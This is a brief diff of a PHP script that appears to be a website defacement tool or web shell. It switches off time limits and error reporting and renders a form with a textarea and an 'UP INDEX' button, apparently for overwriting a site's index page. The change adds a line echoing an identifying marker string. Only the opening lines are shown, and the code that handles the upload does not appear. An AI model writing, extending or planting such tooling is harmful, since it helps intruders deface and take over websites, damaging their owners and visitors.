@@ -1,6 +1,7 @@
 <?php	
 set_time_limit(0);
 error_reporting(0);
+echo 'M4DI~UciH4';
 echo'<center><form method="post">
 <textarea name="index" style="width: 600px; height: 400px;"></textarea><br><br>
 <input type="submit" value="UP INDEX" name="up" />
